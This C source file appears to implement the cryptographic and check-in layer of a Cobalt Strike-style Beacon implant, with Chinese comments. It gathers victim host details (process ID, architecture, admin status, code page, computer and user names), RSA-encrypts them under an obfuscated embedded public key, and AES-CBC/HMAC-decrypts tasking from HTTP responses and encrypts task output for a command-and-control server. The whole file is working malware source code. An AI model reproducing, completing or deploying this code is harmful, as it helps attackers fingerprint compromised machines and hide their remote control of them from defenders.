#include "encrypt_decrypt.h"
#include "tomcrypt_argchk.h"
#include <time.h>
#include "common.h"
#include "BeaconX64.h"
#include "comm.h"
//#include "tomcrypt_math.h"
//extern const ltc_math_descriptor ltm_desc;
int sha256_idx;
int aes_idx;


int aes_key_hash_ago_16[4];
int aes_key_hash_up_16[4];
char initialization_vector[16];

symmetric_key beacon_symmetric_key;
symmetric_CBC beacon_symmetric_CBC;

/*beacon id*/
DWORD beacon_id;
WORD CryptoScheme;

int old_Timestamp;

DWORD rng_win32(BYTE* pbBuffer, DWORD dwLen)
{
	DWORD result = NULL;
	HCRYPTPROV phProv;
	phProv = 0;
	if (!CryptAcquireContextA(&phProv, 0, "Microsoft Base Cryptographic Provider v1.0", 1, 0xF0000020)
		&& (result = CryptAcquireContextA(&phProv, 0, "Microsoft Base Cryptographic Provider v1.0", 1, 0xF0000028)) == 0)
	{
		return result;
	}
	if (!CryptGenRandom(phProv, dwLen, pbBuffer))
	{
		result = 0;
	}
	CryptReleaseContext(phProv, 0);
	return result;
}

int my_rng_win32(BYTE* pbBuffer, DWORD dwLen)
{
	char v2; // bl
	int v3;
	bool i; // zf
	int v5;
	BYTE* v6;
	int v9;

	int v10;

	clock_t v11;
	clock_t v12;
	v2 = 0;
	v3 = dwLen;
	v9 = 0;
	v10 = 0;
	for (i = dwLen == 0; ; i = v3 == 0)
	{
		v5 = 8;
		if (i)
		{
			break;
		}
		--v3;
		do
		{
			--v5;
			do
			{
				v11 = clock();
				while (v11 == clock())
				{
					v10 ^= 1u;
				}
				v12 = clock();
				while (v12 == clock())
				{
					v9 ^= 1u;
				}
			} while (v10 == v9);
			v2 = v10 | (2 * v2);
		} while (v5);
		v6 = pbBuffer++;
		*v6 = v2;
		v2 = 0;
	}
	return dwLen;
}

int random_bytesarray(BYTE* pbBuffer, DWORD dwLen)
{
	int result;

	result = rng_win32(pbBuffer, dwLen);
	if (!result)
	{
		result = my_rng_win32(pbBuffer, dwLen);
	}
	return result;
}

int random_int()
{
	BYTE pbBuffer[4];
	random_bytesarray(pbBuffer, 4);
	return *(DWORD*)pbBuffer;
}

int gen_beacon_id()
{
	return random_int() & 0x7FFFFFFE;
}

void init_beacon_aes_key(char* beacon_key)
{
	int out_hash[8];
	unsigned long a5 = 32;
	register_hash(&sha256_desc);
	sha256_idx = find_hash("sha256");
	if (hash_memory(sha256_idx, (const unsigned char*)beacon_key, 16, (unsigned char*)out_hash, &a5))// hash_memory
		exit(1);
	aes_key_hash_ago_16[0] = out_hash[0];
	aes_key_hash_ago_16[1] = out_hash[1];
	aes_key_hash_ago_16[2] = out_hash[2];
	aes_key_hash_ago_16[3] = out_hash[3];
	aes_key_hash_up_16[0] = out_hash[4];
	aes_key_hash_up_16[1] = out_hash[5];
	aes_key_hash_up_16[2] = out_hash[6];
	aes_key_hash_up_16[3] = out_hash[7];
	memcpy(initialization_vector, "abcdefghijklmnop", sizeof(initialization_vector));
	register_cipher(&aes_desc);
	aes_idx = find_cipher("aes");
	if (rijndael_setup((const unsigned char*)aes_key_hash_ago_16, 16, 0, &beacon_symmetric_key))
		exit(1);
}

//记得定义LTM_DESC
//#define LTM_DESC 

/// <summary>
/// rsa加密
/// </summary>
/// <param name="Rsa_Public_key"></param>
/// <param name="data"></param>
/// <param name="data_size"></param>
/// <param name="outdata"></param>
/// <param name="outdatasize"></param>
/// <returns></returns>
int rsa_encrypt(char* Rsa_Public_key, IN void* data, IN size_t data_size, OUT char* outdata, int* outdatasize)
{
	int prng_idx;
	int result;
	rsa_key pkey;

	CryptoScheme = decryptWORD(shark_CryptoScheme);
	register_prng(&sprng_desc);
	prng_idx = find_prng("sprng");

	//之前的ltc_mp是不注释的****
	//这里需要对ltc_mp赋值否则rsa_import会无法使用
	ltc_mp = ltm_desc;
    //int a = 1;
    //ltc_mp.init((void **)&a);

	//rsa_import((const unsigned char*)a1, 162, &v8);
	//result = rsa_encrypt_key_ex((const unsigned char*)Src, Size, (unsigned char*)a4,
	//	(unsigned long*)a5, (const unsigned char*)"lparam", 6, NULL, prng_idx, sha256_idx, LTC_LTC_PKCS_1_V1_5, &v8);

//libtomcrypt版本判断是使用LTC_LTC_PKCS_1_V1_5还是LTC_PKCS_1_V1_5
#ifdef libtomcrypt117
	if (rsa_import((const unsigned char*)Rsa_Public_key, 162, &pkey) ||
		(result = rsa_encrypt_key_ex((const unsigned char*)data, data_size, (unsigned char*)outdata,
			(unsigned long*)outdatasize, (const unsigned char*)"lparam", 6, NULL, prng_idx, sha256_idx, LTC_LTC_PKCS_1_V1_5, &pkey)) != 0)
	{
		exit(1);
	}
#else
	if (rsa_import((const unsigned char*)Rsa_Public_key, 162, &pkey) ||
		(result = rsa_encrypt_key_ex((const unsigned char*)data, data_size, (unsigned char*)outdata,
			(unsigned long*)outdatasize, (const unsigned char*)"lparam", 6, NULL, prng_idx, sha256_idx, LTC_PKCS_1_V1_5, &pkey)) != 0)
	{
		exit(1);
	}
#endif

	return result;
}

/// <summary>
/// 构造元数据并加密
/// </summary>
/// <param name="Metadata">此参数是临时buffer</param>
/// <param name="size">临时buffer的大小</param>
void Generate_encryption_metadata(char* Metadata, int size)
{
	UINT codepage = GetACP();        // 获得当前系统的代码页编码
	UINT oem = GetOEMCP();
	int machine = 0;
	BYTE beacon_key[16];
	random_bytesarray(beacon_key, 0x10);            // 产生随机的16个字节 和aes密钥有关
	init_beacon_aes_key((char*)beacon_key);             // 初始化 has256和aes 保存aes key
	srand(GetTickCount() ^ GetCurrentProcessId());
	beacon_id = gen_beacon_id();       // 随机产生一个4字节充当beacon id

	if (X86orX64())
	{
		machine = 2;
	}
	else
	{
		if (!Is_Wow64(GetCurrentProcess()))
		{
			if (is_admin())
			{
				machine |= 8;
			}
		}
		else
		{
			machine |= 4;
			if (is_admin())
			{
				machine |= 8;
			}
		}
	}

	beaconmetadata pbeaconmetadata;
	BeaconMetadataInit(&pbeaconmetadata, Metadata, size);
	BeaconMetadataPush_N(16, &pbeaconmetadata, beacon_key);
	BeaconMetadataPush_N(2, &pbeaconmetadata, &codepage);
	BeaconMetadataPush_N(2, &pbeaconmetadata, &oem);
	BeaconMetadataPush_4(beacon_id, &pbeaconmetadata);
	DWORD pid = GetCurrentProcessId();
	BeaconMetadataPush_4(pid, &pbeaconmetadata);
	BeaconMetadataPush_2(0, &pbeaconmetadata);
	BeaconMetadataPush_1(machine ,&pbeaconmetadata);
	get_pc_info(&pbeaconmetadata);                // 构造计算机名 用户名 进程名
	int MetadataLength = BeaconMetadataLength(&pbeaconmetadata);
	memset(g_Encryption_Metadata, 0, sizeof(g_Encryption_Metadata));
	g_Encryption_Metadata_size = 128;
	memcpy(g_Encryption_Metadata, Metadata, MetadataLength);// copy数据准备加密


	char* rsa_publickey = (char*) decryptString(shark_rsa_publickey);              // 获取RSA公钥


	rsa_encrypt(rsa_publickey, Metadata, MetadataLength, g_Encryption_Metadata, &g_Encryption_Metadata_size);// rsa加密
	memset(Metadata, 0, MetadataLength);
}

/// <summary>
/// aes 解密 http请求返回数据
/// </summary>
/// <param name="encrypt_data_buffer"></param>
/// <param name="data_size"></param>
/// <returns></returns>
size_t decrypt_output_data(char* encrypt_data_buffer, int data_size)
{
	if (data_size <= 16 && data_size % 16)
	{
		return 0;
	}
	int decrypt_buffer_size = data_size - 16;
	char* decrypt_buffer = (char*)malloc(decrypt_buffer_size);
	memset(decrypt_buffer, 0, decrypt_buffer_size);
	if (!decrypt_buffer)
	{
		return 0;
	}
	char hmac_memory_out_buf[16];
	unsigned long hmac_memory_out_size = 16;
	

	//验证
	if (hmac_memory(sha256_idx, (const unsigned char*)aes_key_hash_up_16 ,16, (const unsigned char*)encrypt_data_buffer, decrypt_buffer_size, (unsigned char*)hmac_memory_out_buf, &hmac_memory_out_size))// 完成
	{

		exit(1);
	}
	
	if (memcmp(&encrypt_data_buffer[decrypt_buffer_size], hmac_memory_out_buf, hmac_memory_out_size))
	{
		free(decrypt_buffer);
		return 0;
	}

	if (CryptoScheme)
	{
		if (CryptoScheme != 1)
		{
			exit(1);
		}
		memcpy(decrypt_buffer,encrypt_data_buffer, decrypt_buffer_size);
	}

	//aes cbc解密
	else if (cbc_start(aes_idx, (const unsigned char*)initialization_vector, (const unsigned char*)aes_key_hash_ago_16, 16, 0, &beacon_symmetric_CBC)
		|| cbc_decrypt((const unsigned char*)encrypt_data_buffer, (unsigned char*)decrypt_buffer, decrypt_buffer_size, &beacon_symmetric_CBC)
		|| cbc_done(&beacon_symmetric_CBC))
	{
		exit(1);
	}

	datap pdata;
	BeaconDataParse(&pdata, (char*)decrypt_buffer, decrypt_buffer_size);
	int Timestamp = BeaconDataInt(&pdata);// 时间戳
	if (Timestamp + 3600 <= old_Timestamp)
	{
		free(encrypt_data_buffer);
		u_long time = htonl(old_Timestamp - Timestamp - 3600);
		BeaconTaskOutput((char*)&time, 4u, 022u);
		return 0;
	}

	int data_length = BeaconDataInt(&pdata); // 任务数据长度

	if (!data_length || data_length > decrypt_buffer_size)
	{
		exit(0);
	}
	char* dataptr = BeaconDataPtr(&pdata, data_length);
	if (!dataptr)
	{
		exit(0);
	}
	memcpy(encrypt_data_buffer, dataptr, data_length);
	old_Timestamp = Timestamp;
	BeaconDataClear(&pdata);
	free(decrypt_buffer);
	return data_length;
}

symmetric_CBC gBeaconCBC;
int aes_cbc_encrypt(int size, char* in)
{
	int v2;
	int a4;

	v2 = size;
	a4 = 16;
	for (int i = size % 16; i; ++v2)
	{
		if (i >= 16)
			break;
		++i;
	}
	if (CryptoScheme)
	{
		if (CryptoScheme != 1) {
			exit(1);
		}
	}

	else if (cbc_start(aes_idx, (const unsigned char*)initialization_vector, (const unsigned char*)aes_key_hash_ago_16, 16, 0, (symmetric_CBC*)&gBeaconCBC)
		|| cbc_encrypt((const unsigned char*)in, (unsigned char*)in, v2, &gBeaconCBC)
		|| cbc_done((symmetric_CBC*)&gBeaconCBC))
	{
		exit(1);
	}
	if (hmac_memory(sha256_idx, (const unsigned char*)aes_key_hash_up_16, 16, (const unsigned char*)in, v2, (unsigned char*)(&in[v2]), (unsigned long*)&a4)) {
		exit(1);
	}

	return v2 + 16;
}



char* aes_encrypt_data(void* data, size_t data_size, int msg_id, int* out_encrypt_data_len)
{
	beaconmetadata pbeaconmetadata;
	char* buff = (char*)malloc(data_size + 48);
	if (!buff)
	{
		*out_encrypt_data_len = 0;
		return 0;
	}
	memset(buff, 0, data_size + 48);

	BeaconMetadataInit(&pbeaconmetadata, buff, data_size + 48);
	BeaconMetadataPush_4(msg_id, &pbeaconmetadata);
	BeaconMetadataPush_N(data_size, &pbeaconmetadata, data);
	int DataLength = BeaconMetadataDataLength(&pbeaconmetadata) + 4;
	if (DataLength <= 0)
	{
		free(buff);
		*out_encrypt_data_len = 0;
		return 0;
	}
	*out_encrypt_data_len = aes_cbc_encrypt(DataLength, buff);// aes加密和Hmac摘要 返回长度
	return buff;
}
